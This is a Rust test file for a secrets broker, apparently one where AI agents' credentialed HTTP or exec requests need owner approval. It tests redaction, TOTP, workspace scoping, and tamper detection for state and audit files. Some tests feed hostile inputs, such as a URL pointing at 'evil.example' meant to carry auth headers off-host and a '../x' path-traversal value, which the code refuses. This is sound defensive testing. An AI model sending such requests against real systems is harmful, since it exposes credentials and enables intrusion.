    // Profiles follow the same rules.
    let mut p = profile(json!({"name": "dbq", "risk": "low",
        "http": {"method": "GET", "url": format!("{}/p/{{{{secret:db.host}}}}", e.url),
                 "headers": {"X-Pass": "{{secret:db.password}}"}}}));
    e.c.put_profile(p.clone()).unwrap();
    let q = e.c.test_run("dbq", BTreeMap::new(), "", "").await.unwrap();
    assert_eq!(q.state, ReqState::Done);
    assert_eq!(*e.target.path.lock().unwrap(), "/p/pub-host-name");
    assert!(!q.result.unwrap().output.contains("hunter2"));
    p.http
        .as_mut()
        .unwrap()
        .headers
        .insert("X-Pass".into(), "{{secret:db}}".into());
    assert_eq!(
        e.c.put_profile(p).unwrap_err().to_string(),
        "secret \"db\" has fields, use {{secret:db.FIELD}}"
    );
    let bad = profile(json!({"name": "dbx", "risk": "low",
        "http": {"method": "GET", "url": format!("{}/p/{{{{secret:db.password}}}}", e.url)}}));
    assert_eq!(
        e.c.put_profile(bad).unwrap_err().to_string(),
        "secrets are not allowed in the url"
    );

    // Updating one field keeps the others; the field list is fixed by the value.
    e.c.put_secret_fields(
        "db",
        db_meta(&host),
        &params(&[("password", "new-pass-77")]),
    )
    .unwrap();
    assert_eq!(
        e.c.secret_public_values("db").unwrap()["host"],
        "pub-host-name"
    );
    assert_eq!(
        fields::resolve(&e.c.vault, "db.password").unwrap(),
        b"new-pass-77"
    );
    let mut m = db_meta(&host);
    m.fields.pop();
    assert!(e.c.set_secret_meta("db", m).is_err());
    let mut m = db_meta(&host);
    m.fields[1].public = false;
    e.c.set_secret_meta("db", m).unwrap();
    e.c.set_secret_meta("db", SecretMeta::default()).unwrap();
    assert_eq!(e.c.secret_metas().unwrap()["db"].fields.len(), 3, "kept");
    assert_eq!(
        e.c.secret_public_values("db").unwrap(),
        params(&[("host", "pub-host-name")])
    );

    // Single values keep working, and a field-shaped single value is refused.
    assert!(
        e.c.put_secret("x", br#"{"ucanrun_fields":{"a":"b"}}"#)
            .is_err()
    );
    e.c.put_secret("db", b"now-a-plain-value").unwrap();
    assert!(e.c.secret_metas().unwrap()["db"].fields.is_empty());
    assert_eq!(
        fields::resolve(&e.c.vault, "db").unwrap(),
        b"now-a-plain-value"
    );
    e.c.delete_secret("db").unwrap();
    assert!(!e.c.secret_metas().unwrap().contains_key("db"));
    assert!(e.c.delete_secret("_totp_secret").is_err());
}

#[tokio::test(flavor = "multi_thread")]
async fn field_resolution_and_redaction() {
    let e = setup().await;
    let mut meta = db_meta("db.example.com");
    meta.fields.push(FieldMeta {
        name: "token".into(),
        public: false,
    });
    let vals = params(&[
        ("host", "h.internal"),
        ("user", "bob"),
        ("password", "pw-secret-1"),
        ("token", "tok-secret-2"),
    ]);
    e.c.put_secret_fields("db", meta, &vals).unwrap();
    let v = &e.c.vault;
    assert_eq!(fields::resolve(v, "db.host").unwrap(), b"h.internal");
    assert_eq!(fields::resolve(v, "gitea").unwrap(), SECRET.as_bytes());
    assert_eq!(
        fields::resolve(v, "db").unwrap_err(),
        "secret \"db\" has fields, use {{secret:db.FIELD}}"
    );
    assert!(fields::resolve(v, "db.nope").is_err());
    assert!(fields::resolve(v, "gitea.x").is_err());
    assert!(fields::resolve(v, "_totp_secret").is_err());
    assert!(fields::resolve(v, "_telegram_token.x").is_err());
    // Every private field of a touched secret is redacted, named or not.
    let meta = e.c.secret_metas().unwrap();
    let mut got: Vec<String> = fields::private_values(v, &["db.host".into()], &meta)
        .into_iter()
        .map(|z| z.to_string())
        .collect();
    got.sort();
    assert_eq!(got, ["pw-secret-1", "tok-secret-2"]);
    assert!(fields::parse(b"plain").is_none());
    assert!(fields::parse(br#"{"ucanrun_fields":{"a":1}}"#).is_none());
    assert!(fields::parse(br#"{"ucanrun_fields":{},"x":1}"#).is_none());
    assert!(fields::parse(br#"{"ucanrun_fields":{"a":"b"}}"#).is_some());
}

// --- owner test runs ---

#[tokio::test(flavor = "multi_thread")]
async fn owner_test_run() {
    let e = setup().await;
    e.pair().await;
    let before = e.tg.dump().matches("reply_markup").count();
    let q =
        e.c.test_run("create", params(&[("repo", "x")]), "", "")
            .await
            .unwrap();
    assert_eq!(q.state, ReqState::Done);
    assert_eq!(q.caller, "web");
    assert_eq!(e.auth(), format!("token {SECRET}"));
    assert!(!serde_json::to_string(&q).unwrap().contains(SECRET));
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(e.tg.dump().matches("reply_markup").count(), before);
    assert!(
        e.c.test_run("create", params(&[("repo", "../x")]), "", "")
            .await
            .is_err()
    );
    // High risk still needs TOTP; the refused run is denied, not left pending.
    assert!(
        e.c.test_run("danger", params(&[("repo", "x")]), "", "")
            .await
            .is_err()
    );
    assert_eq!(e.c.requests()[0].state, ReqState::Denied);
    let n = e.hits();
    let (sec, _) = e.enable_totp();
    let q =
        e.c.test_run("danger", params(&[("repo", "x")]), &e.code_now(&sec), "")
            .await
            .unwrap();
    assert_eq!(q.state, ReqState::Done);
    assert_eq!(e.hits(), n + 1);
}

// --- lock, state and audit ---

#[tokio::test(flavor = "multi_thread")]
async fn lock_denies_pending_and_blocks_agents() {
    let e = setup().await;
    e.pair().await;
    let (t, val) = e.token("c", &[]);
    let r =
        e.c.submit(&t, "create", params(&[("repo", "a")]), "")
            .unwrap();
    e.tg.last_button("/repos/a").await;
    e.c.lock("web");
    let q = e.c.get(&r.id).unwrap();
    assert_eq!((q.state, q.decided_by.as_str()), (ReqState::Denied, "lock"));
    assert!(!e.c.telegram_status().configured, "bot still running");
    let err =
        e.c.submit(&t, "create", params(&[("repo", "b")]), "")
            .unwrap_err();
    assert!(matches!(err, Error::Locked) && err.status() == 423);
    assert!(matches!(e.c.authenticate(&val), Err(Error::Locked)));
    assert!(matches!(e.c.profiles(), Err(Error::Locked)));
    assert!(matches!(
        e.c.login(b"wrong wrong wrong", ""),
        Err(Error::Vault(vault::Error::BadPass))
    ));
    e.c.login(PASS.as_bytes(), "").unwrap();
    assert!(e.c.telegram_status().configured);
    assert!(matches!(
        e.c.decide(&r.id, &r.hash, true, "web", "", ""),
        Err(Error::Decided)
    ));
    assert_eq!(e.hits(), 0);
    wait_for("lock shown", || {
        e.tg.dump().contains("Kết thúc: denied (lock)")
    })
    .await;
}

#[tokio::test(flavor = "multi_thread")]
async fn tampered_state_refused() {
    let e = setup().await;
    e.token("c", &[]);
    e.c.lock("web");
    let p = e.dir.join("state.json");
    let b = std::fs::read_to_string(&p).unwrap();
    assert!(b.contains("\"risk\":\"high\""));
    std::fs::write(&p, b.replacen("\"risk\":\"high\"", "\"risk\":\"low\"", 1)).unwrap();
    let err = e.c.login(PASS.as_bytes(), "").unwrap_err();
    assert!(matches!(err, Error::Tampered), "{err}");
    assert!(e.c.locked() && e.c.vault.is_locked());
    assert!(e.audit_events(3).iter().any(|x| x == "state_tamper"));
    assert!(e.c.unlock_at_start(PASS.as_bytes()).is_err());
    assert!(e.c.locked());
}

#[tokio::test(flavor = "multi_thread")]
async fn state_versioning_and_migration() {
    let e = setup().await;
    let k = e.c.vault.mac_key().unwrap();
    e.c.lock("test");
    let p = e.dir.join("state.json");
    let sign = |data: &str, mac_of: &str| {
        let mut m = <hmac::Hmac<Sha256> as hmac::Mac>::new_from_slice(&k).unwrap();
        hmac::Mac::update(&mut m, mac_of.as_bytes());
        let mac = hex::encode(hmac::Mac::finalize(m).into_bytes());
        format!("{{\"mac\":\"{mac}\",\"data\":{data}}}")
    };
    // Old state without a version counts as 0 and migrates.
    let old = r#"{"profiles":{"p":{"name":"p","risk":"low"}},"tokens":{},"telegram":{"user_id":42,"chat_id":42},"totp_enabled":false,"last_totp_step":0}"#;
    std::fs::write(&p, sign(old, old)).unwrap();
    e.c.login(PASS.as_bytes(), "").unwrap();
    {
        let g = e.c.inner();
        let st = g.st.as_ref().unwrap();
        assert_eq!(st.version, CURRENT_STATE_VERSION);
        assert_eq!(st.telegram.user_id, 42);
        assert_eq!(st.profiles["p"].name, "p");
    }
    e.c.delete_profile("p").unwrap();
    assert!(
        std::fs::read_to_string(&p)
            .unwrap()
            .contains("\"version\":1")
    );
    e.c.lock("test");
    // Tampered old state is refused.
    std::fs::write(&p, sign(&old.replace("\"low\"", "\"high\""), old)).unwrap();
    assert!(matches!(
        e.c.login(PASS.as_bytes(), ""),
        Err(Error::Tampered)
    ));
    assert!(e.c.locked() && e.c.vault.is_locked());
    // Newer state is refused and left untouched.
    let future = State {
        version: CURRENT_STATE_VERSION + 1,
        ..Default::default()
    };
    state::save(&p, &future, &k).unwrap();
    let before = std::fs::read(&p).unwrap();
    let err = e.c.login(PASS.as_bytes(), "").unwrap_err();
    assert!(matches!(err, Error::StateTooNew), "{err}");
    assert!(e.c.locked() && e.c.vault.is_locked());
    assert_eq!(std::fs::read(&p).unwrap(), before);
}

#[tokio::test(flavor = "multi_thread")]
async fn audit_truncation_detected() {
    let e = setup().await;
    e.token("agent1", &[]);
    e.c.lock("test");
    e.c.login(PASS.as_bytes(), "").unwrap();
    assert!(!e.c.audit_truncated(), "normal lock and login flagged");
    e.c.lock("test");
    let (anchored, _) = e.c.audit.head();
    assert!(anchored >= 3);
    let p = e.dir.join("audit.jsonl");
    let b = std::fs::read_to_string(&p).unwrap();
    let lines: Vec<&str> = b.trim_end().split('\n').collect();
    std::fs::write(&p, format!("{}\n", lines[..lines.len() - 1].join("\n"))).unwrap();
    e.c.login(PASS.as_bytes(), "").unwrap();
    assert!(!e.c.locked(), "owner locked out after truncation");
    assert!(e.c.audit_truncated());
    let es = e.c.audit.tail(10).unwrap();
    let cut = es.iter().find(|x| x.event == "audit_truncated").unwrap();
    assert_eq!(cut.fields["count"], json!(anchored));
    let h = e.c.health().unwrap();
    assert_eq!(h.iter().find(|i| i.key == "audit").unwrap().level, "bad");
}

#[tokio::test(flavor = "multi_thread")]
async fn unlock_at_start_skips_totp_and_serves_agents() {
    let e = setup().await;
    e.pair().await;
    e.enable_totp();
    e.c.lock("web");
    assert!(e.c.unlock_at_start(b"wrong passphrase here").is_err());
    assert!(e.c.locked());
    e.c.unlock_at_start(PASS.as_bytes()).unwrap();
    assert!(!e.c.locked());
    assert!(e.c.telegram_status().configured);
    let (t, _) = e.token("c", &[]);
    assert!(!e.c.profiles_for(&t).unwrap().is_empty());
    assert!(e.audit_events(5).iter().any(|x| x == "auto_unlock"));
    e.c.unlock_at_start(PASS.as_bytes()).unwrap(); // already open
}

#[tokio::test(flavor = "multi_thread")]
async fn exec_off_by_default() {
    let e = new_env("vi", true).await;
    e.c.setup(PASS.as_bytes()).unwrap();
    let p = profile(
        json!({"name": "e", "risk": "low", "exec": {"argv": ["/usr/bin/git", "--version"]}}),
    );
    e.c.put_profile(p.clone()).unwrap();
    let (t, _) = e.token("t", &[]);
    e.c.close();
    let off = Core::new(Options {
        data_dir: e.dir.clone(),
        work_factor: 10,
        ..Default::default()
    })
    .unwrap();
    off.login(PASS.as_bytes(), "").unwrap();
    assert!(matches!(off.put_profile(p.clone()), Err(Error::ExecOff)));
    assert_eq!(
        off.preview(&p, &BTreeMap::new()).error,
        Error::ExecOff.to_string()
    );
    assert!(matches!(
        off.submit(&t, "e", BTreeMap::new(), ""),
        Err(Error::ExecOff)
    ));
    assert!(!off.exec_enabled());
}

// --- connections ---

#[tokio::test(flavor = "multi_thread")]
async fn connections() {
    let e = setup().await;
    let conn = |base: &str| -> Connection {
        serde_json::from_value(json!({"name": "svc", "base_url": base,
            "auth": {"type": "bearer", "secret": "gitea"}, "headers": {"Accept": "application/json"}}))
        .unwrap()
    };
    e.c.put_connection(conn(&format!("{}/api", e.url))).unwrap();
    e.c.put_profile(profile(json!({"name": "svc-get", "risk": "low", "auto_approve": true,
        "connection": "svc", "params": [{"name": "id", "pattern": "[a-z0-9]{1,8}", "required": true}],
        "http": {"method": "GET", "url": "/items/{{id}}"}})))
        .unwrap();
    let (t, _) = e.token("c", &[]);
    let r =
        e.c.submit(&t, "svc-get", params(&[("id", "abc")]), "")
            .unwrap();
    let q = e.c.wait(&r.id, Some(Duration::from_secs(5))).await.unwrap();
    assert_eq!(q.state, ReqState::Done);
    assert_eq!(e.auth(), format!("Bearer {SECRET}"));
    assert!(q.display.contains("/api/items/abc") && !q.display.contains(SECRET));
    // A profile cannot take over the auth header or leave the host.
    for (http, conn_name) in [
        (json!({"method": "GET", "url": "//evil.example/x"}), "svc"),
        (
            json!({"method": "GET", "url": "/x", "headers": {"Authorization": "Bearer {{secret:other}}"}}),
            "svc",
        ),
        (json!({"method": "GET", "url": "/x"}), "ghost"),
    ] {
        let p = profile(
            json!({"name": "svc-bad", "risk": "low", "connection": conn_name, "http": http}),
        );
        assert!(e.c.put_profile(p).is_err(), "{conn_name}");
    }
    // Moving the connection moves every profile on it.
    e.c.put_connection(conn(&format!("{}/v2", e.url))).unwrap();
    let r =
        e.c.submit(&t, "svc-get", params(&[("id", "abc")]), "")
            .unwrap();
    assert!(r.display.contains("/v2/items/abc"), "{}", r.display);
    // A change that would break a profile is refused as a whole.
    let broken: Connection = serde_json::from_value(
        json!({"name": "svc", "base_url": "https://{{x}}.example", "auth": {"type": "none"}}),
    )
    .unwrap();
    assert!(e.c.put_connection(broken).is_err());
    assert_eq!(
        e.c.delete_connection("svc").unwrap_err().to_string(),
        "connection is used by: svc-get"
    );
    e.c.delete_profile("svc-get").unwrap();
    e.c.delete_connection("svc").unwrap();
    assert!(e.c.connections().unwrap().is_empty());
    // Choosing the secret moves to the connection.
    e.pair().await;
    e.c.put_secret("other", b"second-secret-value-42").unwrap();
    e.c.put_connection(
        serde_json::from_value(json!({"name": "pick", "base_url": e.url,
            "auth": {"type": "token", "choices": ["gitea", "other"]}}))
        .unwrap(),
    )
    .unwrap();
    e.c.put_profile(profile(
        json!({"name": "pick-me", "risk": "low", "connection": "pick",
        "http": {"method": "GET", "url": "/me"}}),
    ))
    .unwrap();
    let r = e.c.submit(&t, "pick-me", BTreeMap::new(), "").unwrap();
    e.tg.last_button("Bấm tên secret").await;
    e.tg.press(OWNER, OWNER, &btn_for(&r, ":1"));
    e.wait_state(&r.id, ReqState::Done).await;
    assert_eq!(e.auth(), "token second-secret-value-42");
}

#[tokio::test(flavor = "multi_thread")]
async fn connection_change_breaking_a_profile_is_refused() {
    let e = setup().await;
    let c = |auth: Value| -> Connection {
        serde_json::from_value(json!({"name": "g", "base_url": e.url, "auth": auth})).unwrap()
    };
    e.c.put_connection(c(json!({"type": "bearer", "secret": "gitea"})))
        .unwrap();
    e.c.put_profile(profile(
        json!({"name": "who", "risk": "low", "auto_approve": true,
        "connection": "g", "http": {"method": "GET", "url": "/user"}}),
    ))
    .unwrap();
    let err =
        e.c.put_connection(c(json!({"type": "bearer", "choices": ["gitea"]})))
            .unwrap_err();
    assert!(
        err.to_string()
            .contains("\"who\" would break: a secret choice needs a human"),
        "{err}"
    );
    assert_eq!(e.c.connections().unwrap()[0].auth.secret, "gitea");
}

// --- preview, health, language ---

#[tokio::test(flavor = "multi_thread")]
async fn preview() {
    let e = setup().await;
    let bad = profile(json!({"name": "Bad Name"}));
    assert!(!e.c.preview(&bad, &BTreeMap::new()).error.is_empty());
    let p = profile(json!({"name": "del", "risk": "low",
        "params": [{"name": "r", "pattern": ".+", "required": true}],
        "http": {"method": "DELETE", "url": "http://api.example.com/{{r}}",
                 "headers": {"Authorization": "Bearer {{secret:missing}}"}}}));
    let out = e.c.preview(&p, &params(&[("r", "x")]));
    let w = out.warnings.join("\n");
    for want in [
        "HTTP không mã hoá",
        "TOTP",
        "nhận mọi thứ",
        "Chưa có secret",
    ] {
        assert!(w.contains(want), "missing {want} in {w}");
    }
    assert!(out.display.contains("‹secret:missing›"), "{}", out.display);
    assert_eq!(e.hits(), 0);
    let j = serde_json::to_value(e.c.preview(&bad, &BTreeMap::new())).unwrap();
    assert_eq!(j["warnings"], json!([]));
}

fn health_item(c: &Core, key: &str) -> HealthItem {
    c.health()
        .unwrap()
        .into_iter()
        .find(|i| i.key == key)
        .unwrap_or_else(|| panic!("no health item {key}"))
}

fn post(name: &str, secret: &str, auto: bool) -> Profile {
    profile(json!({"name": name, "risk": "low", "auto_approve": auto,
        "http": {"method": "POST", "url": "https://example.com/x",
                 "headers": {"Authorization": format!("Bearer {{{{secret:{secret}}}}}")}}}))
}

#[tokio::test(flavor = "multi_thread")]
async fn health_checks() {
    let e = new_env("en", false).await;
    e.c.setup(PASS.as_bytes()).unwrap();
    let c = &e.c;
    assert_eq!(health_item(c, "totp").level, "bad");
    assert!(!c.health().unwrap().iter().any(|i| i.key == "recovery"));
    for (n, want) in [(0, "bad"), (2, "warn"), (3, "ok")] {
        {
            let mut g = c.inner();
            let st = g.st.as_mut().unwrap();
            st.totp_enabled = true;
            st.recovery_hashes = vec![String::new(); n];
        }
        assert_eq!(health_item(c, "recovery").level, want, "{n} codes");
    }
    assert_eq!(health_item(c, "exec").level, "ok");
    assert_eq!(health_item(c, "audit").level, "ok");
    assert_eq!(health_item(c, "telegram").level, "warn");

    c.vault.put("orphan", b"hunter2-value").unwrap();
    c.vault.put("used", b"v").unwrap();
    c.put_profile(post("a", "used", false)).unwrap();
    c.put_profile(post("b", "gone", false)).unwrap();
    let i = health_item(c, "unused_secrets");
    assert_eq!(
        (i.level.as_str(), i.names),
        ("warn", vec!["orphan".to_string()])
    );
    let i = health_item(c, "missing_secrets");
    assert_eq!(
        (i.level.as_str(), i.names),
        ("bad", vec!["gone".to_string()])
    );

    let mut pick = post("pick", CHOICE_REF, false);
    pick.secret_choices = vec!["orphan".into()];
    c.put_profile(pick).unwrap();
    c.delete_profile("b").unwrap();
    assert_eq!(health_item(c, "unused_secrets").level, "ok");
    assert_eq!(health_item(c, "missing_secrets").level, "ok");

    c.put_profile(post("writer", "used", true)).unwrap();
    let mut read = post("reader", "used", true);
    read.http.as_mut().unwrap().method = "GET".into();
    c.put_profile(read).unwrap();
    assert_eq!(health_item(c, "auto_write").names, ["writer"]);
    assert!(health_item(c, "lint").names.contains(&"writer".to_string()));

    c.create_token("wide", vec![]).unwrap();
    c.create_token("narrow", vec!["a".into()]).unwrap();
    assert_eq!(health_item(c, "unscoped_tokens").names, ["wide"]);

    // A field reference counts for its secret.
    let vals = params(&[("host", "h"), ("user", "u"), ("password", "pw-value")]);
    let mut m = db_meta("db.example.com");
    m.hosts.clear();
    c.put_secret_fields("db", m, &vals).unwrap();
    assert!(
        health_item(c, "unused_secrets")
            .names
            .contains(&"db".to_string())
    );
    c.put_profile(post("dbp", "db.password", false)).unwrap();
    assert_eq!(health_item(c, "unused_secrets").level, "ok");
    assert_eq!(health_item(c, "missing_secrets").level, "ok");
    let j = serde_json::to_string(&c.health().unwrap()).unwrap();
    assert!(!j.contains("hunter2") && !j.contains("pw-value"));

    c.inner().audit_cut = true;
    assert_eq!(health_item(c, "audit").level, "bad");
    c.lock("test");
    assert!(matches!(c.health(), Err(Error::Locked)));
}

#[tokio::test(flavor = "multi_thread")]
async fn telegram_speaks_english_by_default() {
    let e = new_env("", false).await;
    assert_eq!(e.c.translate("sai mã TOTP"), "Wrong TOTP code");
    assert_eq!(e.c.translate("unknown text"), "unknown text");
    let vi = new_env("vi", false).await;
    assert_eq!(vi.c.translate("sai mã TOTP"), "sai mã TOTP");
    let r = Request {
        id: "x".into(),
        profile: policy::ADHOC_PROFILE.into(),
        params: BTreeMap::new(),
        caller: "claude".into(),
        reason: "why".into(),
        risk: "high".into(),
        totp: true,
        hash: "ab".repeat(32),
        display: "GET https://x".into(),
        state: ReqState::Pending,
        device: String::new(),
        app: String::new(),
        duration_ms: None,
        created: UNIX_EPOCH,
        expires: UNIX_EPOCH + Duration::from_secs(120),
        decided_by: String::new(),
        choices: vec!["a".into()],
        secret: String::new(),
        result: None,
    };
    assert_eq!(
        lang::approval_text(&r, false),
        "⚠️ HIGH RISK, needs TOTP\n✍️ The agent wrote this command itself. Read it carefully.\n\n\
         Profile: agent-call\nAgent: claude\nExpires in: 120 seconds\n\nCommand to run:\nGET https://x\n\n\
         Reason (stated by the agent, unverified): why\n\nTap the secret to use this time.\n\nCode: abababab"
    );
}

#[test]
fn reason_is_cleaned() {
    assert_eq!(clean_reason("a\nb\u{202e}c\u{7}d"), "a bcd");
    let long = "é".repeat(250);
    let c = clean_reason(&long);
    assert_eq!(c.chars().count(), 201);
    assert!(c.ends_with('…'));
}

// --- golden data from Go ---

fn copy_dir(src: &Path, dst: &Path) {
    std::fs::create_dir_all(dst).unwrap();
    for e in std::fs::read_dir(src).unwrap() {
        let e = e.unwrap();
        let t = dst.join(e.file_name());
        if e.file_type().unwrap().is_dir() {
            copy_dir(&e.path(), &t);
        } else {
            std::fs::copy(e.path(), t).unwrap();
        }
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn golden_datadir_opens() {
    let golden = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/golden");
    let ex: Value =
        serde_json::from_slice(&std::fs::read(golden.join("expected.json")).unwrap()).unwrap();
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().join("data");
    copy_dir(&golden.join("datadir"), &dir);
    // A clock after the last TOTP step the Go run used.
    let at = UNIX_EPOCH + Duration::from_secs((59_787_886 + 10) * 30);
    let c = Core::new(Options {
        data_dir: dir,
        work_factor: 10,
        now: Some(Arc::new(move || at)),
        ..Default::default()
    })
    .unwrap();
    let pass = ex["passphrase"].as_str().unwrap().as_bytes();
    assert!(c.initialized() && c.locked());
    assert!(matches!(c.login(pass, ""), Err(Error::NeedTotp)));
    assert!(c.locked());
    let code = totp::code(ex["totp_secret"].as_str().unwrap(), unix(at)).unwrap();
    c.login(pass, &code).unwrap();
    assert!(!c.audit_truncated());
    let names: Vec<String> = c.profiles().unwrap().into_iter().map(|p| p.name).collect();
    assert_eq!(names, ["github-whoami"]);
    let conns = c.connections().unwrap();
    assert_eq!(conns[0].name, "github");
    assert_eq!(conns[0].auth.secret, "github_token");
    let meta = c.secret_metas().unwrap();
    assert_eq!(
        meta["github_token"].hosts,
        ["api.github.com", "*.example.com"]
    );
    let t = c.authenticate(ex["token"].as_str().unwrap()).unwrap();
    assert_eq!(t.name, "claude");
    let s = c.secrets_for(&t).unwrap();
    assert_eq!(s.len(), 1);
    assert_eq!(s[0].name, "github_token");
    assert!(s[0].description.starts_with("Token GitHub"));
    let p = c.preview(&c.profiles().unwrap()[0], &BTreeMap::new());
    assert!(p.error.is_empty(), "{}", p.error);
    assert!(
        p.display.starts_with("GET https://api.github.com/user"),
        "{}",
        p.display
    );
    assert_eq!(health_item(&c, "audit").level, "ok");
    assert_eq!(c.recovery_left(), 8);
    assert_eq!(c.tokens().unwrap().len(), 1);
    c.lock("test");
    let rc = ex["recovery_codes"][0].as_str().unwrap();
    c.login(pass, rc).unwrap();
    assert_eq!(c.recovery_left(), 7);
    assert!(audit::verify(&c.audit_path()).is_ok());
}

#[tokio::test(flavor = "multi_thread")]
async fn totp_is_set_per_secret() {
    let e = setup().await;
    let (t, _) = e.token("claude", &[]);
    let (sec, _) = e.enable_totp();
    let meta = |totp: &str| SecretMeta {
        totp: totp.into(),
        ..Default::default()
    };

    // Default: follows the risk level.
    let r =
        e.c.submit(&t, "danger", params(&[("repo", "a")]), "")
            .unwrap();
    assert!(r.totp && e.c.needs_totp(&r.id));
    let low =
        e.c.submit(&t, "create", params(&[("repo", "a")]), "")
            .unwrap();
    assert!(!low.totp);
    assert!(matches!(
        e.c.decide(&r.id, &r.hash, true, "web", "", ""),
        Err(Error::NeedTotp)
    ));

    // Waiving TOTP for a secret needs a current code.
    assert!(matches!(
        e.c.authorize_secret_totp("gitea", "never", ""),
        Err(Error::NeedTotp)
    ));
    assert!(matches!(
        e.c.authorize_secret_totp("gitea", "never", "000000"),
        Err(Error::BadTotp)
    ));
    e.c.authorize_secret_totp("gitea", "never", &e.code_now(&sec))
        .unwrap();
    e.c.set_secret_meta("gitea", meta("never")).unwrap();
    // Already "never": saving notes again asks for nothing.
    e.c.authorize_secret_totp("gitea", "never", "").unwrap();
    let r2 =
        e.c.submit(&t, "danger", params(&[("repo", "b")]), "")
            .unwrap();
    assert!(!r2.totp && r2.risk == "high");
    assert!(lang::approval_text(&r2, true).starts_with("⚠️ RỦI RO CAO\n"));
    e.c.decide(&r2.id, &r2.hash, true, "web", "", "").unwrap();
    e.wait_state(&r2.id, ReqState::Done).await;
    // A request queued before the change keeps what it was shown with.
    assert!(e.c.needs_totp(&r.id));

    // "always" needs TOTP even for low risk, and stops auto approval.
    e.c.authorize_secret_totp("gitea", "always", "").unwrap();
    e.c.set_secret_meta("gitea", meta("always")).unwrap();
    let r3 =
        e.c.submit(&t, "auto", params(&[("repo", "c")]), "")
            .unwrap();
    assert_eq!(r3.state, ReqState::Pending, "auto approved past TOTP");
    assert!(r3.totp && r3.risk == "low");
    assert!(lang::approval_text(&r3, true).starts_with("Yêu cầu chạy lệnh · 🔐 Cần mã TOTP"));
    assert!(matches!(
        e.c.decide(&r3.id, &r3.hash, true, "web", "", ""),
        Err(Error::NeedTotp)
    ));
    let health = e.c.health().unwrap();
    assert!(!health.iter().any(|i| i.key == "secret_totp"));
    e.c.set_secret_meta("gitea", meta("never")).unwrap();
    let health = e.c.health().unwrap();
    let w = health.iter().find(|i| i.key == "secret_totp").unwrap();
    assert_eq!(
        (w.level.as_str(), w.names.clone()),
        ("warn", vec!["gitea".to_string()])
    );
    assert!(
        e.c.audit
            .tail(50)
            .unwrap()
            .iter()
            .any(|x| x.event == "secret_meta" && x.fields["totp"] == "never")
    );
    assert!(
        SecretMeta {
            totp: "sometimes".into(),
            ..Default::default()
        }
        .validate()
        .is_err()
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn run_log_records_who_where_what_and_how_long() {
    let e = setup().await;
    let (t, _) = e.token("claude", &[]);
    let client = ClientInfo::new("laptop-1\u{202e}", "claude-code 2.1 <b>");
    assert_eq!(client.device, "laptop-1");
    assert_eq!(client.app, "claude-code 2.1 b");
    let r =
        e.c.submit_from(&t, &client, "create", params(&[("repo", "a")]), "make it")
            .unwrap();
    assert_eq!(
        (r.device.as_str(), r.app.as_str()),
        ("laptop-1", "claude-code 2.1 b")
    );
    e.c.decide(&r.id, &r.hash, true, "web", "", "").unwrap();
    let done = e.wait_state(&r.id, ReqState::Done).await;
    assert!(done.duration_ms.is_some());
    let res =
        e.c.audit
            .tail(20)
            .unwrap()
            .into_iter()
            .find(|x| x.event == "result")
            .unwrap();
    let f = &res.fields;
    assert_eq!(res.actor, "web");
    assert_eq!(f["agent"], "claude");
    assert_eq!(f["device"], "laptop-1");
    assert_eq!(f["app"], "claude-code 2.1 b");
    assert_eq!(f["profile"], "create");
    assert_eq!(f["secrets"], json!(["gitea"]));
    assert_eq!(f["ok"], true);
    assert!(f["duration_ms"].is_u64());
    assert!(f["command"].as_str().unwrap().contains("‹secret:gitea›"));
    assert!(!serde_json::to_string(f).unwrap().contains(SECRET));
    let req =
        e.c.audit
            .tail(20)
            .unwrap()
            .into_iter()
            .find(|x| x.event == "request")
            .unwrap();
    assert_eq!(req.fields["device"], "laptop-1");
    assert!(audit::verify(&e.c.audit_path()).is_ok());
}

#[tokio::test(flavor = "multi_thread")]
async fn tokens_limited_to_workspaces_see_and_use_only_their_secrets() {
    let e = setup().await;
    let host = e.url.trim_start_matches("http://").to_string();
    let ws = |w: &str| SecretMeta {
        hosts: vec![host.clone()],
        workspace: w.into(),
        ..Default::default()
    };
    e.c.set_secret_meta("gitea", ws("Công việc")).unwrap();
    e.c.put_secret("home", b"home-secret-value-123").unwrap();
    e.c.set_secret_meta("home", ws("")).unwrap();
    assert!(
        SecretMeta {
            workspace: " x".into(),
            ..Default::default()
        }
        .validate()
        .is_err()
    );
    assert!(
        SecretMeta {
            workspace: "a".repeat(33),
            ..Default::default()
        }
        .validate()
        .is_err()
    );
    assert!(
        e.c.create_token_in("bad", vec![], vec!["a,b".into()])
            .is_err()
    );

    let all =
        e.c.authenticate(&e.c.create_token("all", vec![]).unwrap())
            .unwrap();
    let work =
        e.c.authenticate(
            &e.c.create_token_in("work", vec![], vec!["Công việc".into()])
                .unwrap(),
        )
        .unwrap();
    let home =
        e.c.authenticate(
            &e.c.create_token_in("home", vec![], vec!["".into()])
                .unwrap(),
        )
        .unwrap();
    let names = |t: &Token| -> Vec<String> {
        e.c.secrets_for(t)
            .unwrap()
            .into_iter()
            .map(|s| s.name)
            .collect()
    };
    assert_eq!(names(&all), ["gitea", "home"]);
    assert_eq!(names(&work), ["gitea"]);
    assert_eq!(names(&home), ["home"]);
    assert_eq!(e.c.secrets_for(&work).unwrap()[0].workspace, "Công việc");

    // Fixed profiles that use gitea are hidden from and refused to "home".
    let listed: Vec<String> =
        e.c.profiles_for(&home)
            .unwrap()
            .into_iter()
            .map(|p| p.name)
            .collect();
    assert!(listed.is_empty(), "{listed:?}");
    assert!(matches!(
        e.c.submit(&home, "create", params(&[("repo", "a")]), ""),
        Err(Error::Forbidden)
    ));
    assert!(
        e.c.submit(&work, "create", params(&[("repo", "a")]), "")
            .is_ok()
    );

    // Agent-written calls: a secret outside the workspaces does not exist.
    let call = |s: &str| Call {
        http: Some(policy::HttpSpec {
            method: "GET".into(),
            url: format!("{}/x", e.url),
            headers: [("A".to_string(), format!("{{{{secret:{s}}}}}"))].into(),
            ..Default::default()
        }),
        exec: None,
    };
    let err =
        e.c.submit_call(&home, &call("gitea"), "")
            .unwrap_err()
            .to_string();
    assert!(err.contains("unknown secret"), "{err}");
    assert!(e.c.submit_call(&home, &call("home"), "").is_ok());
    assert!(e.c.submit_call(&work, &call("home"), "").is_err());
    assert!(e.c.submit_call(&all, &call("home"), "").is_ok());
}
